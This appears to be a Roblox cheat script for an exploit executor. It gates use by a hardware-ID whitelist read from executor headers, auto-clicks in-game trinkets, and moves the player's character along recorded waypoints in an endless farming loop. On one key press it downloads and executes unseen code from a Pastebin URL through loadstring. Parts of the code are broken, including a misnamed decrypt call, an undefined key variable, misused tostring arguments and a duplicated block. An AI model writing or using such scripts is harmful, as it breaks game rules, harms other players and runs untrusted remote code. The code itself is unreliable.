local keys = {"$B&E(H+MbQeThWmZ"}
local hwids = {
    "111ff687575ee3631836b9c9567660f0e2a50be7ff80dd7351fdbb9373832468758d008a3a1cea4181a1c3e101e73c074f7f0fd98a3ed05806c529f7c5508fdf",
    "f647159585b6c1bda3721204ebb2ee3f0d5cebf3a0625afe803111d2db2457d9b3a6ca93069bb281e0415aeabdda3aa0514a85e45371c1bcf910b9152b369845",
}
local first = true
local first2 = true
local first3 = true
local count = 0
local count2 = 0
local savePoints = {}
local fileSavePoints = {}
local isAutoPickup = true
input = game:GetService("UserInputService")
tweenService = game:GetService("TweenService")

local http_request = http_request;
if syn then
    http_request = syn.request
elseif SENTINEL_V2 then
    function http_request(tb)
        return {
            StatusCode = 200;
            Body = request(tb.Url, tb.Method, (tb.Body or ''))
        }
    end
end
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
local hwid = "";

for i, v in next, hwid_list do
    if decoded.headers[v] then
        hwid = decoded.headers[v];
        break
    end
end 

for i,v in pairs(hwids) do
    if v == hwid then
        break
    elseif v ~= hwid and i == #hwids then
        game.Players.LocalPlayer:Kick("Not whitelisted!")
    end
end
for i,v in pairs(keys) do
    if v == key then
        break
    elseif v ~= key and i == #keys then
        game.Players.LocalPlayer:Kick("Not whitelisted!")
    end
end
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
local hwid = "";

for i, v in next, hwid_list do
    if decoded.headers[v] then
        hwid = decoded.headers[v];
        break
    end
end 
function calculateTime(s, d)
    local time = d/s
    return time
end

function detectTrinkets(trinket)
    local part
    local returned
    if trinket.Name == "Part" and trinket:FindFirstChild("ID") then
        returned = true
    else
        returned = false
    end
    return returned, trinket
end

function autoPickup(connectTrinket)
    spawn(function()
        local player = game.Players.LocalPlayer
        while isAutoPickup do
            local leWorkspace = game.Workspace:GetChildren()
            print("DEBUG TABLE TYPE CHECK: ",type(leWorkspace))
            for i,v in pairs(leWorkspace) do
                local _, trinket = detectTrinkets(v)
                if _ then
                    local part = trinket:WaitForChild("Part")
                    local clickdetector = part:WaitForChild("ClickDetector")
                    local maxDistance = clickdetector.MaxActivationDistance - 0.1
                    while not player.Character:FindFirstChild("Head") do 
                        wait(0.1)
                    end
                    if player:DistanceFromCharacter(part.Position) < maxDistance and player.Character.Head then
                        fireclickdetector(clickdetector)
                    end
                    if connectTrinket then
                        local part = connectTrinket:FindFirstChild("Part")
                        local clickdetector2 = part:FindFirstChild("ClickDetector")
                        if player:DistanceFromCharacter(part.Position) < maxDistance and player.Character.Head then
                            fireclickdetector(clickdetector2)
                        end
                    end         
                end
            end
            wait()
        end
    end)
end


input.InputBegan:Connect(function(key)
    if key.KeyCode == Enum.KeyCode.E then 
        if first2 then
            writefile("path.txt", "")
            first2 = false
        end
        if not game.Workspace:FindFirstChild("folderDubs") then
            print("FOLDER DEBUG CHECK")
            folderDubs = Instance.new("Folder", game.Workspace)
            folderDubs.Name = "folderDubs"
        end
        local sphere = Instance.new('Part')
        sphere.Size = Vector3.new(1, 1, 1) -- Size, 1 is 1 stud by 1 stud.
        sphere.Shape = Enum.PartType.Ball -- Make it a sphere
        sphere.Anchored = true
        sphere.CanCollide = false
        sphere.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame -- Position it
        sphere.Parent = game.Workspace.folderDubs -- Parent it
        sphere.Material = Enum.Material.Neon
        count2 = count2 + 1
        local encrypted = syn.crypt.encrypt(tostring(sphere.Position.x, " ", sphere.Position.y, " ", sphere.Position.z, " "), "epicness")
        appendfile("path.txt", encrypted)
        local stuff = readfile("path.txt")
        local stuff2 = syn.crypt.decrypt(stuff, "epicness")
        folderCopy = folderDubs:Clone()
        table.insert(fileSavePoints, count2, stuff2)
        table.insert(savePoints, count2, folderCopy)
    end
    if key.KeyCode == Enum.KeyCode.J then
        if first2 then
            writefile("path.txt", "")
            first2 = false
        end
        if not game.Workspace:FindFirstChild("folderDubs") then
            folderDubs = Instance.new("Folder", game.Workspace)
            folderDubs.Name = "folderDubs"
        end
        local sphere = Instance.new('Part')
        sphere.Size = Vector3.new(1, 1, 1) -- Size, 1 is 1 stud by 1 stud.
        sphere.Shape = Enum.PartType.Ball -- Make it a sphere
        sphere.Anchored = true
        sphere.Color = Color3.fromRGB(0, 0, 255)
        sphere.CanCollide = false
        sphere.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame -- Position it
        sphere.Parent = game.Workspace.folderDubs -- Parent it
        sphere.Material = Enum.Material.Neon
        local encrypted = syn.crypt.encrypt(tostring("(", sphere.Position.x, " ", sphere.Position.y, " ", sphere.Position.z, " "), "epicness")
        appendfile("path.txt", encrypted)
        count2 = count2 + 1
        folderCopy = folderDubs:Clone()
        table.insert(savePoints, count2, folderCopy)
        local stuff = readfile("path.txt")
        local stuff2 = syn.crypt.decrypt(stuff, "epicness")
        table.insert(fileSavePoints, count2, stuff2)
    end
    if key.KeyCode == Enum.KeyCode.Y then
        folderDubs:Destroy()
        folderDubs = Instance.new("Folder", game.Workspace)
        folderDubs.Name = "folderDubs"
        delfile("path.txt")
        first2 = true
        count = 0
        count2 = 0
    end
    if key.KeyCode == Enum.KeyCode.T then
        count2 = count2 - 1
        folderDubs:Destroy()
        folderDubs = savePoints[count2]:Clone()
        folderDubs.Parent = game.Workspace
        writefile("path.txt", fileSavePoints[count2])
        print("DEBUG SAVE POINT REVERSION: ",count2)
    end
    if key.KeyCode == Enum.KeyCode.H then
        autoPickup()
        local newCoords = {}
        local CFrames = {} 
        local stopPoints = {}
        local stopPoints2 = {}
        if not isfile("path.txt") then return end
        stuff2 = readfile("path.txt")
        stuff = syn.crypt.decrypted(stuff2, epicness)
        spawn(function()loadstring(game:HttpGet("https://pastebin.com/raw/ERDp2x5W", true))()
        for word in stuff:gmatch("(.-)".." ") do  
            count = count + 1
            if word:sub(1, 1) == "(" then
                table.insert(stopPoints, count)
                table.insert(newCoords, string.sub(word, 2))
            else
                table.insert(newCoords, word)
            end
        end
        for i,v in pairs(newCoords) do
        end
        for i,v in pairs(newCoords) do
            if (i+2)%3 == 0 then
                table.insert(CFrames, CFrame.new(v, newCoords[i+1], newCoords[i+2]))
            end
        end
        for i,v in pairs(stopPoints2) do
        end
        for i,v in pairs(stopPoints) do
            if v % 3 == 0 then
                table.insert(stopPoints2, v)
            end
        end
        while true do
            for i,v in pairs(CFrames) do
                if first then
                    local time = calculateTime(speed, game.Players.LocalPlayer:DistanceFromCharacter(Vector3.new(v.x, v.y, v.z)))
                    tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = v}):Play()
                    wait(time)
                    for i2,vd in pairs(stopPoints2) do
                        if i == vd/3 then
                            game.Players.LocalPlayer.Character.Torso.Anchored = true
                            wait(trinketSpawnWaitTimes)
                            game.Players.LocalPlayer.Character.Torso.Anchored = false
                        end
                                    writefile("crashlogs.txt", "CRASHED POINT 4")
                    end 
                else
                    local temp = CFrames[i+1]
                    local temp1 = Vector3.new(v.x, v.y, v.z)
                    local temp2 = Vector3.new(temp.x, temp.y, temp.z)
                    local distance = (temp1 - temp2).magnitude
                    local time = calculateTime(speed, distance)
                    tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = v}):Play()
                    wait(time)
                    for i2, v2 in pairs(stopPoints2) do
                        if i == v2/3 then
                            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                            wait(trinketSpawnWaitTimes)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
                        end
                    end
                end
            end
        wait(lootCycleWaitTimes*60)
        end
    end)
end
end)

